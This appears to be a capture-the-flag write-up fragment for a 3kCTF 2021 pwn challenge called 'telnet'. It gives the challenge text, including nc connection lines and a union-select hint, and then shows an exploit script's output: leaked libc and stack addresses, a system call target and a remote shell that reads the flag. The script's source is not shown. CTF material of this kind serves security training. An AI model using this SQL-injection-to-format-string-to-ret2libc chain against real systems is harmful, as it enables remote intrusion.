```
telnet - 500pts - 0 solves - Author: rekter0

I've setup my raspberry to control it remotely, i've made a secure telnet service for this purpose,
Can you help me spot any vulnerabilities ?

Mirror 1
nc telnet.2021.3k.ctf.to 8080

Mirror 2
nc telnet2.2021.3k.ctf.to 8080

Mirror 3
nc telnet3.2021.3k.ctf.to 8080

Attachment

Notes:
- DB is same on remote
- Remote is running on real ARM device, given qemu emulation in attachment is only for testing/debugging, a reliable exploit should work on both envs

Hints
1. i can union select (it's a pwning challenge, dont go crazy with requests, DB is already given with challenge files, its same on remote)
```

```
$ python3 sploit.py 
[+] LIBC_BASE 0x76dc9000
[+] STACK_PTR 0x7e850018
[*] BINSH_STR 0x76ef4b6c
[*] SYSTEM    0x76e019c8
[*] GADGET  1 0x76ea39c0
OK

> 
> ls
[...]
[...]
[...]
2aa$/bin/sh: 0: can't access tty; job control turned off
$ cat flag.txt
3k{sql_and_fmt_whyyy_8364349278372}
$ 
```